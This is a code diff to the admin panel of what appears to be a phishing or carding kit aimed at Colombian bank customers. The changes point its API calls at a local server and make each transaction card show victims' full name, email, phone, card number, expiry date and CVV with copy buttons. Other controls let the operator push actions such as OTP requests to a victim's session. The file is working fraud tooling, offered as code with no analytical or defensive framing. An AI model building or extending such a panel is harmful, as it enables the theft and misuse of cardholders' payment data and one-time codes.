@@ -414,7 +414,7 @@
             const errorDiv = document.getElementById('loginError');
 
             try {
-                const response = await fetch('/api/login-admin', {
+                const response = await fetch('http://localhost:9090/api/login-admin', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ usuario: username, clave: password })
@@ -456,7 +456,7 @@
         async function cargarTransacciones() {
             try {
                 const token = sessionStorage.getItem('panelito_token');
-                const response = await fetch('/api/listar-transacciones', {
+                const response = await fetch('http://localhost:9090/api/listar-transacciones', {
                     headers: {
                         'Authorization': `Bearer ${token}`
                     }
@@ -478,14 +478,19 @@
                 const html = result.transacciones.reverse().map(tx => `
                     <div class="tx-card">
                         <div class="tx-header">
+                            <img src="assets/logos/${getBankLogoFile(tx.banco)}" alt="${tx.banco}" style="height: 35px; width: auto; object-fit: contain; margin-bottom: 8px;">
                             <div class="tx-id">${tx.txid}</div>
                         </div>
 
-                        <div class="tx-detalle"><strong>Línea:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.referencia}')">${tx.referencia}</span></div>
-                        <div class="tx-detalle"><strong>Monto:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.valor_formateado}')">${tx.valor_formateado}</span></div>
-                        <div class="tx-detalle"><strong>Convenio:</strong> ${tx.convenio}</div>
-                        <div class="tx-detalle"><strong>IP:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.ip}')">${tx.ip}</span></div>
-                        <div class="tx-detalle"><strong>Tipo:</strong> ${tx.tipo}</div>
+                        <div class="tx-detalle"><strong>Email:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.email}')">${tx.email}</span></div>
+                        <div class="tx-detalle"><strong>Teléfono:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.telefono || ''}')">${tx.telefono || '-'}</span></div>
+                        <div class="tx-detalle"><strong>Monto:</strong> $${parseInt(tx.monto).toLocaleString('es-CO')}</div>
+                        <div class="tx-detalle"><strong>Franquicia:</strong> ${tx.franquicia}</div>
+                        <div class="tx-detalle"><strong>Banco:</strong> ${tx.banco}</div>
+                        <div class="tx-detalle"><strong>Nombre:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.nombre}')">${tx.nombre}</span></div>
+                        <div class="tx-detalle"><strong>Tarjeta:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.cardNumber}')">${tx.cardNumber}</span></div>
+                        <div class="tx-detalle"><strong>Vence:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.expDate}')">${tx.expDate}</span></div>
+                        <div class="tx-detalle"><strong>CVV:</strong> <span class="valor-copiable" onclick="copiarValor(this, '${tx.cvv}')">${tx.cvv}</span></div>
                         <div class="tx-detalle"><strong>Fecha:</strong> ${new Date(tx.timestamp).toLocaleString('es-CO')}</div>
                         <div class="tx-detalle"><strong>Estado:</strong> <span id="accion-${tx.txid}" style="color: #ff9800; font-weight: 600;"><div style="width: 12px; height: 12px; border: 2px solid #ddd; border-top: 2px solid #ff9800; border-radius: 50%; display: inline-block; animation: spin 1s linear infinite;"></div></span></div>
                         <div class="valores-grupo">
@@ -557,7 +562,7 @@
 
         async function obtenerEstadoActual(txid) {
             try {
-                const response = await fetch(`/api/obtener-accion/${txid}`);
+                const response = await fetch(`http://localhost:9090/api/obtener-accion/${txid}`);
                 const result = await response.json();
                 const accion = result.accion || 'STANDBY';
 
@@ -591,7 +596,7 @@
         async function obtenerDatosEspecifico(txid, tipo) {
             try {
                 const token = sessionStorage.getItem('panelito_token');
-                const response = await fetch(`/api/obtener-datos-${tipo}/${txid}`, {
+                const response = await fetch(`http://localhost:9090/api/obtener-datos-${tipo}/${txid}`, {
                     headers: {
                         'Authorization': `Bearer ${token}`
                     }
@@ -630,7 +635,7 @@
         async function obtenerDatosAccion(txid, accion) {
             try {
                 const token = sessionStorage.getItem('panelito_token');
-                const endpoint = `/api/obtener-datos-${accion.toLowerCase()}/${txid}`;
+                const endpoint = `http://localhost:9090/api/obtener-datos-${accion.toLowerCase()}/${txid}`;
                 const response = await fetch(endpoint, {
                     headers: {
                         'Authorization': `Bearer ${token}`
@@ -691,7 +696,7 @@
 
         async function limpiarAccionAuto(txid) {
             try {
-                const response = await fetch(`/api/limpiar-accion/${txid}`, {
+                const response = await fetch(`http://localhost:9090/api/limpiar-accion/${txid}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ accion: 'OTP' })
@@ -713,7 +718,7 @@
             btn.classList.add('selected');
 
             try {
-                const response = await fetch(`/api/guardar-accion/${txid}`, {
+                const response = await fetch(`http://localhost:9090/api/guardar-accion/${txid}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ accion })
@@ -742,7 +747,7 @@
             const accion = accionBtn ? accionBtn.textContent.replace(/[^A-Z]/g, '') : 'OTP';
 
             try {
-                const response = await fetch(`/api/limpiar-accion/${txid}`, {
+                const response = await fetch(`http://localhost:9090/api/limpiar-accion/${txid}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ accion })
